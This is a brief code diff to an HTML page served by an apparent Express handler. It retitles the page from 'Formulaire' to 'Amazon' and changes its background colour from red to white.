@@ -13,14 +13,14 @@ res.send(`
 
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Formulaire</title>
+<title>Amazon</title>
 
 <style>
 
 body{
 margin:0;
 font-family: Arial, sans-serif;
-background: #ff0000);
+background: #ffffff);
 height:100vh;
 display:flex;
 flex-direction:column;
